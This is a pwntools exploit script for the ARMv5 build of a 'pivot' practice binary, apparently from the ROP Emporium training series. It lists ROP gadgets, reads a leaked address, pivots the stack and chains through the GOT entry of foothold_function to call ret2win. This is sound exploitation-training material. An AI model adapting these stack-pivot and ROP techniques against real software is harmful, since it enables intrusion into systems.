#!/usr/bin/env python3
from pwn import *
import os

os.environ["QEMU_LD_PREFIX"] = "/usr/arm-linux-gnueabi"

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'pivot_armv5')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# ./pivot_armv5_exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

# ropper --arch ARM --file pivot_armv5
# 0x000105d4: pop {r3, pc};
# 0x000106f8: bx r3;
# 0x00010760: pop {r4, pc};
# 0x000108f0: mov r5, r4; mov r4, sp; mov sp, r5; pop {r4, r11, pc};
# 0x00010900: ldr r0, [r11, #-0x10]; ldr r0, [r0]; pop {r4, r11, pc};
# 0x0001090c: ldr r1, [r11, #-0x10]; add r0, r0, r1; str r0, [r11, #-8]; bx lr;
# 0x00010924: ldr r3, [r11, #-8]; ldr r7, [r11, #-0xc]; blx r3;
# 0x00010984: pop {r4, r5, r6, r7, r8, r9, r10, pc};
POP_R3_PC = p32(0x105d4)
BX_R3 = p32(0x106f8)
POP_R4_PC = p32(0x10760)
MOV_R5_SP_POP_PC = p32(0x108f0)
LDR_R0 = p32(0x10900)
LDR_R1 = p32(0x1090c)
LDR_R3_R7_BLX_R3 = p32(0x10924)
POP_R45678910_PC = p32(0x10984)

# ropper --arch ARMTHUMB --file pivot_armv5
# 0x0001091c (0x0001091d): mov lr, r4; adds r3, r7, #0; bx r3;
MOV_LR_R4_ADDS_R3_R7_BX_R3 = p32(0x1091d)

# (r2) iS
# (r2) pd @ 0x000105d8 (.plt section)
# ╎   ;-- rsym.foothold_function:
# ╎   ;-- foothold_function:
# ╎   0x0001064c      00c68fe2       add ip, pc, 0, 12
FOOTHOLD_PLT = p32(0x1064c)

# (r2) iS
# pd @ 0x00021000 (.got section)
# ;-- reloc.foothold_function:
# ; DATA XREF from sym.imp.foothold_function @ 0x10654(r)
# 0x0002102c      .dword 0x000105d8 ; section..plt ; fcn.000105d8; RELOC 32 foothold_function
FOOTHOLD_GOT = p32(0x2102c)

# r2 libpivot_armv5.so
# (r2) aaa; afl
# 0x00000834    1     32 sym.foothold_function
# 0x000009c0    3    168 sym.ret2win
RET2WIN_OFFSET = 0x9c0 - 0x834

io = start()

io.recvuntil(b"libpivot\n")
NEW_SP = int((io.recvline()[-9:-1]).decode(), 16)
io.recvuntil(b"> ")

# Payload
payload  = p32(0xa5) + p32(NEW_SP+44)
payload += POP_R3_PC + MOV_LR_R4_ADDS_R3_R7_BX_R3 + POP_R45678910_PC
payload += LDR_R0 + 2*p32(0xa5) + FOOTHOLD_PLT + FOOTHOLD_GOT + 2*p32(0xa5)
payload += BX_R3
payload += LDR_R3_R7_BLX_R3 + p32(NEW_SP+80) + LDR_R3_R7_BLX_R3
payload += p32(RET2WIN_OFFSET) + LDR_R1 + MOV_LR_R4_ADDS_R3_R7_BX_R3

io.sendline(payload)

# Pivot
padding = b'A' * cyclic_find(0x6161616a)

pivot = padding
pivot += POP_R4_PC + p32(NEW_SP) + MOV_R5_SP_POP_PC

io.recvuntil(b"> ")
io.sendline(pivot)

io.interactive()
